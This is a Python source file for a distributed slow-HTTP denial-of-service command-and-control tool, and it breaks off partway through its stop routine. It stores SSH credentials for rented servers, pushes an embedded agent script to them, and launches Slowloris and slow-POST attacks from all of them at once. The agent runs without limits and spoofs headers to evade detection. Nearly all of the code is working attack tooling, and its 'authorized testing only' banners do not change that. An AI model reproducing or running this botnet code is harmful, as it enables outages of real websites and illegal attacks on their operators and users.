#!/usr/bin/env python3
"""
Distributed Slow HTTP Testing C2 - Complete Final Fixed Version
Author: Security Research Tool
Purpose: Educational and Authorized Penetration Testing Only

⚠️  WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️
Unauthorized use against systems you don't own is ILLEGAL!
"""

import sqlite3
import paramiko
import threading
import json
import time
import os
import sys
import signal
import socket
import random
import string
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import base64
from cryptography.fernet import Fernet
import colorama
from colorama import Fore, Back, Style
from urllib.parse import urlparse

# Initialize colorama for cross-platform colored output
colorama.init(autoreset=True)

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    PURPLE = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    BOLD = Style.BRIGHT
    DIM = Style.DIM
    RESET = Style.RESET_ALL

class SecurityManager:
    def __init__(self):
        key_file = 'key.key'
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                self.key = f.read()
        else:
            self.key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(self.key)
            os.chmod(key_file, 0o600) 
        self.cipher = Fernet(self.key)
    
    def encrypt_password(self, password):
        return base64.b64encode(self.cipher.encrypt(password.encode())).decode()
    
    def decrypt_password(self, encrypted_password):
        try:
            return self.cipher.decrypt(base64.b64decode(encrypted_password.encode())).decode()
        except Exception:
            return encrypted_password

class DatabaseManager:
    def __init__(self, db_file='c2_database.db'):
        self.db_file = db_file
        self.init_database()
    
    def init_database(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        # VPS nodes table - TANPA agent_deployed dan attack_count
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vps_nodes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT NOT NULL UNIQUE,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                ssh_port INTEGER DEFAULT 22,
                status TEXT DEFAULT 'offline',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                location TEXT,
                capabilities TEXT
            )
        ''')
        
        # Attack sessions table - TANPA total_connections dan success_rate
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_name TEXT NOT NULL,
                target_url TEXT NOT NULL,
                target_host TEXT,
                attack_type TEXT NOT NULL,
                vps_nodes TEXT,
                start_time TIMESTAMP,
                end_time TIMESTAMP,
                status TEXT DEFAULT 'pending',
                parameters TEXT,
                results TEXT
            )
        ''')
        
        # Attack results table - TANPA bytes_sent dan error_message
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id INTEGER,
                vps_ip TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                connections_active INTEGER DEFAULT 0,
                packets_sent INTEGER DEFAULT 0,
                status TEXT,
                FOREIGN KEY (session_id) REFERENCES attack_sessions (id)
            )
        ''')
        
        # Attack logs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id INTEGER,
                vps_ip TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                log_level TEXT DEFAULT 'INFO',
                message TEXT NOT NULL,
                FOREIGN KEY (session_id) REFERENCES attack_sessions (id)
            )
        ''')
        
        conn.commit()
        conn.close()
        
        # Set secure permissions
        os.chmod(self.db_file, 0o600)
    
    def add_vps(self, ip, username, encrypted_password, port=22, location="Unknown"):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                INSERT INTO vps_nodes (ip_address, username, password, ssh_port, location)
                VALUES (?, ?, ?, ?, ?)
            ''', (ip, username, encrypted_password, port, location))
            conn.commit()
            return cursor.lastrowid
        except sqlite3.IntegrityError:
            return None
        finally:
            conn.close()
    
    def get_all_vps(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM vps_nodes ORDER BY id')
        vps_list = cursor.fetchall()
        conn.close()
        return vps_list
    
    def update_vps_status(self, ip, status):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE vps_nodes SET status = ?, last_seen = ? WHERE ip_address = ?
        ''', (status, datetime.now().isoformat(), ip))
        conn.commit()
        conn.close()
    
    def remove_vps(self, ip):
        conn = sqlite3.connect(self.db_file)
        cursor = cursor = conn.cursor()
        cursor.execute('DELETE FROM vps_nodes WHERE ip_address = ?', (ip,))
        affected_rows = cursor.rowcount
        conn.commit()
        conn.close()
        return affected_rows > 0
    
    def create_attack_session(self, session_name, target_url, target_host, attack_type, vps_list, parameters):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO attack_sessions (session_name, target_url, target_host, attack_type, vps_nodes, parameters, start_time, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (session_name, target_url, target_host, attack_type, json.dumps(vps_list), json.dumps(parameters), datetime.now().isoformat(), 'running'))
        
        session_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return session_id
    
    def get_attack_sessions(self, limit=20):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM attack_sessions ORDER BY start_time DESC LIMIT ?', (limit,))
        sessions = cursor.fetchall()
        conn.close()
        return sessions
    
    def log_attack_event(self, session_id, vps_ip, level, message):
        """Log attack events"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO attack_logs (session_id, vps_ip, log_level, message)
            VALUES (?, ?, ?, ?)
        ''', (session_id, vps_ip, level, message))
        conn.commit()
        conn.close()
    
    def update_session_status(self, session_id, status, end_time=None):
        """Update session status"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        if end_time:
            cursor.execute('''
                UPDATE attack_sessions SET status = ?, end_time = ? WHERE id = ?
            ''', (status, end_time, session_id))
        else:
            cursor.execute('''
                UPDATE attack_sessions SET status = ? WHERE id = ?
            ''', (status, session_id))
        
        conn.commit()
        conn.close()

class SSHManager:
    def __init__(self, security_manager):
        self.connections = {}
        self.security_manager = security_manager
        self.connection_cache = {}  # Cache VPS credentials
        self.lock = threading.Lock()
    
    def connect_vps(self, ip, username, encrypted_password, port=22, timeout=15):
        try:
            password = self.security_manager.decrypt_password(encrypted_password)
            
            # Cache credentials for auto-reconnect
            self.connection_cache[ip] = {
                'username': username,
                'encrypted_password': encrypted_password,
                'port': port
            }
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                hostname=ip,
                username=username,
                password=password,
                port=port,
                timeout=timeout,
                look_for_keys=False,
                allow_agent=False
            )
            
            # Test connection with simple command
            stdin, stdout, stderr = ssh.exec_command('echo "test" && whoami', timeout=10)
            output = stdout.read().decode().strip()
            error = stderr.read().decode().strip()
            
            if not output or error:
                ssh.close()
                return False, f"Connection test failed: {error if error else 'No output'}"
            
            with self.lock:
                if ip in self.connections:
                    try:
                        self.connections[ip].close()
                    except:
                        pass
                self.connections[ip] = ssh
            
            return True, f"Connected successfully as {output.split()[-1]}"
            
        except paramiko.AuthenticationException:
            return False, "Authentication failed - invalid credentials"
        except paramiko.SSHException as e:
            return False, f"SSH error: {str(e)}"
        except socket.timeout:
            return False, "Connection timeout"
        except Exception as e:
            return False, f"Connection failed: {str(e)}"
    
    def reconnect_vps(self, ip):
        """Attempt to reconnect to VPS using cached credentials"""
        if ip not in self.connection_cache:
            return False, "No cached credentials for this VPS"
        
        cached = self.connection_cache[ip]
        return self.connect_vps(
            ip, 
            cached['username'], 
            cached['encrypted_password'], 
            cached['port']
        )
    
    def disconnect_vps(self, ip):
        with self.lock:
            if ip in self.connections:
                try:
                    self.connections[ip].close()
                    del self.connections[ip]
                    return True
                except Exception:
                    pass
        return False
    
    def execute_command(self, ip, command, timeout=60, auto_reconnect=True):
        """Execute command with auto-reconnect capability"""
        
        # Check if connection exists, try to reconnect if not
        if ip not in self.connections:
            if auto_reconnect:
                print(f"[SSH] No connection to {ip}, attempting reconnect...")
                success, message = self.reconnect_vps(ip)
                if not success:
                    return False, f"Reconnection failed: {message}"
            else:
                return False, "No connection to VPS"
        
        try:
            with self.lock:
                ssh_client = self.connections[ip]
            
            stdin, stdout, stderr = ssh_client.exec_command(command, timeout=timeout)
            
            # Set timeout for reading
            stdout.channel.settimeout(timeout)
            stderr.channel.settimeout(timeout)
            
            output = stdout.read().decode('utf-8', errors='ignore').strip()
            error = stderr.read().decode('utf-8', errors='ignore').strip()
            exit_status = stdout.channel.recv_exit_status()
            
            if exit_status == 0:
                return True, output if output else "Command executed successfully"
            else:
                return False, error if error else f"Command failed with exit status {exit_status}"
                
        except socket.timeout:
            return False, "Command execution timeout"
        except Exception as e:
            # Connection might be broken, remove it
            with self.lock:
                if ip in self.connections:
                    try:
                        self.connections[ip].close()
                    except:
                        pass
                    del self.connections[ip]
            
            # Try to reconnect and execute again if auto_reconnect is enabled
            if auto_reconnect:
                print(f"[SSH] Command failed on {ip}, attempting reconnect and retry...")
                success, message = self.reconnect_vps(ip)
                if success:
                    return self.execute_command(ip, command, timeout, auto_reconnect=False)
                else:
                    return False, f"Reconnection failed: {message}"
            
            return False, str(e)
    
    def deploy_agent(self, ip):
        """Deploy unlimited slow HTTP attack agent to VPS"""
        
        # Complete unlimited agent script
        agent_script = '''#!/usr/bin/env python3
import socket,threading,time,sys,random,string,signal,argparse
from urllib.parse import urlparse

class SlowHTTPAttack:
    def __init__(self,host,port=80):
        self.host,self.port,self.conns,self.running=host,port,[],False
        self.stats={'sent':0,'errors':0,'active':0}
        self.lock = threading.Lock()
    
    def create_socket(self):
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((self.host,self.port))
            return s
        except Exception as e:
            with self.lock:
                self.stats['errors']+=1
            return None
    
    def slowloris_attack(self,num_conns=100,delay=15,duration=0):
        print(f"[SLOWLORIS] Starting attack on {self.host}:{self.port}")
        print(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
        
        self.running=True
        start_time=time.time()
        
        # UNLIMITED: Aggressive connection creation - no artificial limits
        print("[PHASE1] Creating initial connections...")
        for i in range(num_conns):
            if not self.running:
                break
            
            sock=self.create_socket()
            if sock:
                try:
                    # Full HTTP request with multiple headers for maximum server load
                    request = f"GET /?slowloris={random.randint(100000,999999)}&cache={time.time()} HTTP/1.1\\r\\n"
                    request += f"Host: {self.host}\\r\\n"
                    request += f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.9,es;q=0.8,fr;q=0.7\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Cache-Control: no-cache\\r\\n"
                    request += "Pragma: no-cache\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "Upgrade-Insecure-Requests: 1\\r\\n"
                    
                    # Convert escape sequences to actual bytes
                    request_bytes = request.encode().decode('unicode_escape').encode()
                    
                    sock.send(request_bytes)
                    self.conns.append(sock)
                    
                    with self.lock:
                        self.stats['sent']+=1
                    
                    if (i+1) % 100 == 0:
                        print(f"[PROGRESS] {i+1}/{num_conns} connections created")
                        
                except Exception as e:
                    with self.lock:
                        self.stats['errors']+=1
                    try:
                        sock.close()
                    except:
                        pass
            
            # MINIMAL DELAY - Maximum connection rate
            if i % 100 == 0:
                time.sleep(0.01)  # Very small delay only every 100 connections
        
        with self.lock:
            self.stats['active']=len(self.conns)
        print(f"[PHASE1] Complete. Active connections: {len(self.conns)}")
        
        if not self.conns:
            print("[ERROR] No connections established, aborting attack")
            return
        
        # Keep connections alive phase - AGGRESSIVE MODE
        print("[PHASE2] Starting aggressive keep-alive phase...")
        cycle_count=0
        
        while self.running and self.conns:
            # Check duration limit
            if duration > 0 and (time.time() - start_time) >= duration:
                print("[DURATION] Time limit reached, stopping attack...")
                break
            
            cycle_count+=1
            active_before=len(self.conns)
            
            # Send multiple headers per connection for maximum server load
            failed_socks = []
            headers_per_cycle = random.randint(2, 5)  # Multiple headers per cycle
            
            for sock in self.conns:
                try:
                    # Send multiple headers to increase server load
                    for _ in range(headers_per_cycle):
                        header_name=''.join(random.choice(string.ascii_letters) for _ in range(random.randint(10,20)))
                        header_value=''.join(random.choice(string.ascii_letters+string.digits+'-_.') for _ in range(random.randint(20,50)))
                        header = f"X-{header_name}: {header_value}\\r\\n"
                        header_bytes = header.encode().decode('unicode_escape').encode()
                        
                        sock.send(header_bytes)
                        with self.lock:
                            self.stats['sent']+=1
                    
                except Exception:
                    failed_socks.append(sock)
                    with self.lock:
                        self.stats['errors']+=1
            
            # Aggressive connection replacement - maintain connection count
            for sock in failed_socks:
                if sock in self.conns:
                    self.conns.remove(sock)
                try:
                    sock.close()
                except:
                    pass
                
                # AGGRESSIVE: Always try to replace lost connections
                replacement_attempts = 3  # Multiple attempts per failed connection
                for attempt in range(replacement_attempts):
                    new_sock=self.create_socket()
                    if new_sock:
                        try:
                            # Full request with randomization
                            req = f"GET /?session={random.randint(100000,999999)}&attempt={attempt} HTTP/1.1\\r\\n"
                            req += f"Host: {self.host}\\r\\n"
                            req += f"User-Agent: SlowHTTP-Agent-{random.randint(1000,9999)}\\r\\n"
                            req += "Connection: keep-alive\\r\\n"
                            req += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\\r\\n"
                            req_bytes = req.encode().decode('unicode_escape').encode()
                            
                            new_sock.send(req_bytes)
                            self.conns.append(new_sock)
                            with self.lock:
                                self.stats['sent']+=1
                            break  # Success, stop attempting
                        except Exception:
                            try:
                                new_sock.close()
                            except:
                                pass
            
            with self.lock:
                self.stats['active']=len(self.conns)
                active_after=len(self.conns)
                sent = self.stats['sent']
                errors = self.stats['errors']
            
            print(f"[CYCLE {cycle_count}] Active: {active_after} | Headers sent: {sent} | Errors: {errors} | Replaced: {active_before-active_after if active_before > active_after else 0}")
            
            # VARIABLE DELAY for unpredictability
            sleep_time = random.uniform(delay * 0.5, delay * 1.5)
            time.sleep(sleep_time)
    
    def slow_post_attack(self,num_conns=50,delay=10,duration=0):
        print(f"[R.U.D.Y] Starting Slow POST attack on {self.host}:{self.port}")
        print(f"[CONFIG] Connections: {num_conns}, Delay: {delay}s, Duration: {'unlimited' if duration==0 else f'{duration}s'}")
        
        self.running=True
        start_time=time.time()
        
        def post_worker(worker_id):
            sock=self.create_socket()
            if not sock:
                print(f"[WORKER {worker_id}] Failed to connect")
                return
            
            try:
                # UNLIMITED: Large content-length for maximum effectiveness
                content_length=random.randint(10000000,100000000)  # 10MB to 100MB range
                
                # Proper HTTP POST format
                post_request = f"POST /form{worker_id}?data=large HTTP/1.1\\r\\n"
                post_request += f"Host: {self.host}\\r\\n"
                post_request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                post_request += f"Content-Length: {content_length}\\r\\n"
                post_request += "Connection: keep-alive\\r\\n"
                post_request += "Expect: 100-continue\\r\\n"  # Forces server to wait
                post_request += "\\r\\n"  # End of headers
                
                # Convert escape sequences properly
                post_bytes = post_request.encode().decode('unicode_escape').encode()
                
                sock.send(post_bytes)
                with self.lock:
                    self.stats['sent']+=1
                    
                print(f"[WORKER {worker_id}] POST headers sent, content-length: {content_length:,} bytes")
                
                # Send POST data extremely slowly - no artificial limits
                bytes_sent=0
                chunk_sizes=[1,2,3,4,5,6,7,8,9,10,15,20]  # Variable chunk sizes
                
                while self.running and bytes_sent < content_length:
                    # Check duration limit
                    if duration > 0 and (time.time() - start_time) >= duration:
                        print(f"[WORKER {worker_id}] Duration limit reached")
                        break
                    
                    # Variable chunk size for unpredictability
                    chunk_size = random.choice(chunk_sizes)
                    remaining = min(chunk_size, content_length - bytes_sent)
                    
                    # Generate data chunk
                    data=''.join(random.choice(string.ascii_letters+string.digits+'=&') for _ in range(remaining))
                    
                    try:
                        sock.send(data.encode())
                        bytes_sent += remaining
                        with self.lock:
                            self.stats['sent'] += remaining
                    except Exception:
                        print(f"[WORKER {worker_id}] Connection lost at {bytes_sent:,} bytes")
                        break
                    
                    # Progress report every 1MB
                    if bytes_sent % 1000000 == 0:
                        progress = (bytes_sent/content_length)*100
                        print(f"[WORKER {worker_id}] Progress: {bytes_sent:,}/{content_length:,} ({progress:.1f}%)")
                    
                    # SLOW TRANSMISSION - The core of R.U.D.Y
                    sleep_time = random.uniform(delay * 0.5, delay * 1.5)  # Variable delay
                    time.sleep(sleep_time)
                
                print(f"[WORKER {worker_id}] Completed: {bytes_sent:,} bytes sent")
                
            except Exception as e:
                print(f"[WORKER {worker_id}] Error: {str(e)}")
                with self.lock:
                    self.stats['errors']+=1
            finally:
                try:
                    sock.close()
                except:
                    pass
        
        # NO THREAD LIMITS - Use all requested connections
        threads=[]
        print(f"[THREADS] Starting {num_conns} R.U.D.Y worker threads...")
        
        # Start all worker threads
        for i in range(num_conns):
            if not self.running:
                break
            thread = threading.Thread(target=post_worker, args=(i+1,), daemon=True)
            thread.start()
            threads.append(thread)
            print(f"[THREAD {i+1}] Worker started")
            time.sleep(0.1)  # Small stagger to avoid overwhelming
        
        # Monitor all threads
        while self.running:
            if duration > 0 and (time.time() - start_time) >= duration:
                print("[DURATION] Time limit reached, stopping...")
                self.running = False
                break
            
            # Count active threads
            active_threads = sum(1 for t in threads if t.is_alive())
            
            with self.lock:
                sent = self.stats['sent']
                errors = self.stats['errors']
            
            print(f"[R.U.D.Y STATUS] Active workers: {active_threads}/{num_conns} | Total bytes sent: {sent:,} | Errors: {errors}")
            
            if active_threads == 0:
                print("[R.U.D.Y] All workers completed")
                break
            
            time.sleep(10)  # Status update interval
    
    def stop_attack(self):
        print("[STOP] Stopping attack...")
        self.running=False
        
        # Close all connections
        for sock in self.conns[:]:
            try:
                sock.close()
            except:
                pass
        self.conns.clear()
        print("[STOP] Attack stopped")

# Better signal handling
attacker = None

def signal_handler(sig,frame):
    global attacker
    print("\\n[SIGNAL] Received interrupt signal")
    if attacker:
        attacker.stop_attack()
    print("[EXIT] Shutting down...")
    sys.exit(0)

def main():
    global attacker
    
    parser=argparse.ArgumentParser(description='Slow HTTP Attack Agent - UNLIMITED EDITION')
    parser.add_argument('target',help='Target URL or hostname')
    parser.add_argument('attack_type',choices=['slowloris','slow_post'],help='Type of attack to perform')
    parser.add_argument('--connections','-c',type=int,default=100,help='Number of connections (default: 100, no upper limit)')
    parser.add_argument('--delay','-d',type=int,default=15,help='Delay between packets in seconds (default: 15, can be 0)')
    parser.add_argument('--duration','-t',type=int,default=0,help='Attack duration in seconds (0=unlimited, default: 0)')
    
    args=parser.parse_args()
    
    # Validate arguments - REMOVED ARTIFICIAL LIMITS
    if args.connections < 1:
        print("ERROR: Connections must be at least 1")
        sys.exit(1)
    
    if args.delay < 0:
        print("ERROR: Delay cannot be negative")
        sys.exit(1)
    
    # Warning for very high connection counts
    if args.connections > 10000:
        print(f"WARNING: Very high connection count ({args.connections:,})")
        print("This may overwhelm your system or network. Continue? (y/N)")
        if input().strip().lower() != 'y':
            sys.exit(1)
    
    # Parse target
    if args.target.startswith('http://') or args.target.startswith('https://'):
        parsed=urlparse(args.target)
        target_host=parsed.hostname
        target_port=parsed.port or (443 if parsed.scheme=='https' else 80)
    else:
        target_host=args.target.split(':')[0]
        if ':' in args.target:
            try:
                target_port = int(args.target.split(':')[1])
            except ValueError:
                target_port = 80
        else:
            target_port=80
    
    print("="*80)
    print("SLOW HTTP ATTACK AGENT - UNLIMITED EDITION")
    print("="*80)
    print(f"Target: {target_host}:{target_port}")
    print(f"Attack: {args.attack_type.upper()}")
    print(f"Connections: {args.connections:,}")
    print(f"Delay: {args.delay}s")
    print(f"Duration: {'Unlimited' if args.duration==0 else f'{args.duration}s'}")
    print("="*80)
    print("WARNING: FOR AUTHORIZED TESTING ONLY!")
    print("="*80)
    
    # Set up signal handlers
    signal.signal(signal.SIGINT,signal_handler)
    signal.signal(signal.SIGTERM,signal_handler)
    
    # Create attacker instance
    attacker=SlowHTTPAttack(target_host,target_port)
    
    try:
        if args.attack_type == "slowloris":
            attacker.slowloris_attack(args.connections,args.delay,args.duration)
        elif args.attack_type == "slow_post":
            attacker.slow_post_attack(args.connections,args.delay,args.duration)
    except KeyboardInterrupt:
        print("\\n[INTERRUPTED] Stopping attack...")
        attacker.stop_attack()
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        attacker.stop_attack()
    finally:
        print("[CLEANUP] Attack completed")

if __name__ == "__main__":
    main()
'''
        
        # Use proper file transfer method
        commands = [
            "mkdir -p /tmp/slowhttp_c2",
            "rm -f /tmp/slowhttp_c2/agent.py"  # Clean old version
        ]
        
        # Execute setup commands
        for cmd in commands:
            success, output = self.execute_command(ip, cmd)
            if not success:
                return False, f"Setup failed: {output}"
        
        # Transfer file using SFTP
        try:
            if ip in self.connections:
                sftp = self.connections[ip].open_sftp()
                
                # Write agent script to temporary local file
                temp_file = f"/tmp/agent_{ip.replace('.','_')}.py"
                with open(temp_file, 'w') as f:
                    f.write(agent_script)
                
                # Upload via SFTP
                sftp.put(temp_file, '/tmp/slowhttp_c2/agent.py')
                sftp.close()
                
                # Clean up local temp file
                os.remove(temp_file)
                
            else:
                return False, "No SSH connection available"
        
        except Exception as e:
            # Fallback to base64 method if SFTP fails
            encoded_script = base64.b64encode(agent_script.encode()).decode()
            cmd = f"echo '{encoded_script}' | base64 -d > /tmp/slowhttp_c2/agent.py"
            success, output = self.execute_command(ip, cmd)
            if not success:
                return False, f"File transfer failed: {output}"
        
        # Set permissions and test
        final_commands = [
            "chmod +x /tmp/slowhttp_c2/agent.py",
            "python3 -m py_compile /tmp/slowhttp_c2/agent.py",  # Compile to check syntax
            "python3 /tmp/slowhttp_c2/agent.py --help | head -5"  # Test execution
        ]
        
        for i, cmd in enumerate(final_commands):
            success, output = self.execute_command(ip, cmd, timeout=20)
            if not success:
                return False, f"Final step {i+1} failed: {output}"
        
        return True, "Agent deployed and tested successfully"
    
    def get_connection_status(self, ip):
        with self.lock:
            return ip in self.connections
    
    def close_all_connections(self):
        with self.lock:
            for ip in list(self.connections.keys()):
                try:
                    self.connections[ip].close()
                except:
                    pass
            self.connections.clear()

class AttackManager:
    def __init__(self, ssh_manager, db_manager):
        self.ssh_manager = ssh_manager
        self.db_manager = db_manager
        self.active_attacks = {}
        self.monitoring_threads = {}
    
    def launch_attack(self, session_id, target_url, attack_type, vps_list, parameters):
        """Launch attack with comprehensive error handling and auto-reconnect"""
        
        # Parse target URL properly
        if target_url.startswith('http'):
            parsed = urlparse(target_url)
            target_host = parsed.hostname or parsed.netloc
        else:
            target_host = target_url.split(':')[0].split('/')[0]
        
        self.active_attacks[session_id] = {
            'target_host': target_host,
            'target_url': target_url,
            'attack_type': attack_type,
            'vps_list': vps_list,
            'status': 'running',
            'start_time': datetime.now(),
            'parameters': parameters
        }
        
        print(f"\n{Colors.YELLOW}[ATTACK] Launching {attack_type} attack on {target_host}{Colors.RESET}")
        print(f"{Colors.CYAN}[CONFIG] VPS nodes: {len(vps_list)} | Connections per VPS: {parameters.get('connections', 1000)}{Colors.RESET}")
        
        success_count = 0
        failed_vps = []
        
        # Get all VPS data from database for reconnection
        all_vps_data = {vps[1]: vps for vps in self.db_manager.get_all_vps()}
        
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[LAUNCHING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # Check connection status and reconnect if necessary
            if not self.ssh_manager.get_connection_status(vps_ip):
                print(f"{Colors.YELLOW}RECONNECTING...{Colors.RESET} ", end="", flush=True)
                
                vps_data = all_vps_data.get(vps_ip)
                if vps_data:
                    reconnect_success, reconnect_msg = self.ssh_manager.connect_vps(
                        vps_data[1], vps_data[2], vps_data[3], vps_data[4]
                    )
                    if reconnect_success:
                        print(f"{Colors.GREEN}CONNECTED{Colors.RESET} ", end="", flush=True)
                        self.db_manager.update_vps_status(vps_ip, 'online')
                    else:
                        print(f"{Colors.RED}CONN_FAILED{Colors.RESET}")
                        failed_vps.append(f"{vps_ip}: Reconnection failed - {reconnect_msg}")
                        continue
                else:
                    print(f"{Colors.RED}NO_DATA{Colors.RESET}")
                    failed_vps.append(f"{vps_ip}: VPS data not found in database")
                    continue
            
            # Build attack command
            cmd = self._build_attack_command_fixed(target_url, attack_type, parameters)
            
            # Execute with longer timeout and better error detection
            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
            
            # Better success detection
            if success and self._is_attack_launched_successfully(output):
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                success_count += 1
                
                # Log success
                self.db_manager.log_attack_event(session_id, vps_ip, 'SUCCESS', f'Attack launched successfully')
                
                # Verify agent is actually running
                time.sleep(2)
                verify_cmd = "ps aux | grep 'python3.*agent.py' | grep -v grep | wc -l"
                verify_success, verify_output = self.ssh_manager.execute_command(vps_ip, verify_cmd, timeout=10)
                
                if verify_success and verify_output.strip() != '0':
                    print(f"  {Colors.GREEN}→ Agent verified running ({verify_output.strip()} processes){Colors.RESET}")
                else:
                    print(f"  {Colors.YELLOW}→ Warning: Agent verification failed{Colors.RESET}")
                
            else:
                print(f"{Colors.RED}FAILED{Colors.RESET}")
                # Detailed error logging
                error_details = self._analyze_launch_error(output)
                failed_vps.append(f"{vps_ip}: {error_details}")
                self.db_manager.log_attack_event(session_id, vps_ip, 'ERROR', f'Launch failed: {error_details}')
        
        if success_count > 0:
            print(f"\n{Colors.GREEN}[SUCCESS] Attack launched on {success_count}/{len(vps_list)} VPS nodes{Colors.RESET}")
            if failed_vps:
                print(f"{Colors.YELLOW}[FAILED VPS]:{Colors.RESET}")
                for failure in failed_vps:
                    print(f"  {failure}")
            return True
        else:
            print(f"\n{Colors.RED}[FAILED] Could not launch attack on any VPS{Colors.RESET}")
            print(f"{Colors.YELLOW}[TROUBLESHOOTING TIPS]:{Colors.RESET}")
            print(f"  1. Verify VPS connections: Test All Connections")
            print(f"  2. Check agent deployment: Deploy Agents")
            print(f"  3. Test single VPS: Test Single VPS")
            for failure in failed_vps:
                print(f"  {failure}")
            return False
    
    def _is_attack_launched_successfully(self, output):
        """Better detection of successful attack launch"""
        success_indicators = [
            "Attack launched with PID",
            "SLOWLORIS] Starting attack",
            "SLOW POST] Starting",
            "nohup: ignoring input",
            "Creating initial connections"
        ]
        
        return any(indicator in output for indicator in success_indicators)
    
    def _analyze_launch_error(self, output):
        """Analyze launch error for better debugging"""
        if "Permission denied" in output:
            return "Permission denied - check SSH credentials"
        elif "No such file" in output:
            return "Agent file not found - redeploy agent"
        elif "python3: command not found" in output:
            return "Python3 not installed on VPS"
        elif "Connection refused" in output:
            return "Target refuses connections"
        elif "Traceback" in output:
            return f"Python error - {output.split('Traceback')[1][:100]}..."
        elif output.strip() == "":
            return "Command executed but no output (timeout?)"
        else:
            return f"Unknown error - {output[:150]}..."
    
    def _build_attack_command_fixed(self, target_url, attack_type, parameters):
        """Build attack command with better error handling"""
        connections = max(1, parameters.get('connections', 100))
        delay = max(0, parameters.get('delay', 15))
        duration = parameters.get('duration', 0)
        
        # Clean target parsing
        target_clean = target_url.replace('http://', '').replace('https://', '').split('/')[0]
        
        # Enhanced command with better logging
        cmd = "cd /tmp/slowhttp_c2 && "
        
        # Check if agent exists
        cmd += "if [ ! -f agent.py ]; then echo 'ERROR: agent.py not found'; exit 1; fi && "
        
        # Launch with nohup and proper logging
        cmd += f"nohup python3 agent.py '{target_clean}' {attack_type} "
        cmd += f"--connections {connections} --delay {delay} "
        
        if duration > 0:
            cmd += f"--duration {duration} "
        
        # Better logging and PID capture
        timestamp = int(time.time())
        cmd += f"> attack_{timestamp}.log 2>&1 & "
        cmd += "sleep 2 && "
        cmd += "PID=$! && "
        cmd += "echo 'Attack launched with PID:' $PID && "
        cmd += "ps aux | grep 'python3.*agent.py' | grep -v grep | head -1"
        
        return cmd
    
    def stop_attack(self, session_id):
        """Enhanced attack stopping with verification"""
        if session_id not in self.active_attacks:
            return False, "Attack session not found"
        
        vps_list = self.active_attacks[session_id]['vps_list']
        
        print(f"\n{Colors.YELLOW}[ATTACK] Stopping attack on all VPS nodes...{Colors.RESET}")
        
        stop_count = 0
        for vps_ip in vps_list:
            print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            # Enhanced process killing sequence
            commands = [
                "pkill -f 'python3.*agent.py' >/dev/null 2>&1 || true",
                "sleep 1",
                "pkill -9 -f 'agent.py' >/dev/null 2>&1 || true", 
                "killall python3 >/dev/null 2>&1 || true",
                "sleep 1",
                # Verify cleanup
                "ps aux | grep 'agent.py' | grep -v grep | awk '{print $2}' | xargs kill -9 >/dev/null 2>&1 || true",
                "sleep 1",
                "ps aux | grep 'agent.py' | grep -v grep | wc -l"
            ]
            
            remaining_procs = None
            for cmd in commands:
                success, output = self.ssh_manager.execute_command(vps_ip, cmd)
                if "wc -l" in cmd and success and output.strip().isdigit():
                    remaining_procs = int(output.strip())
            
            if remaining_procs is not None and remaining_procs == 0:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                stop_count += 1
            elif remaining_procs is not None and remaining_procs > 0:
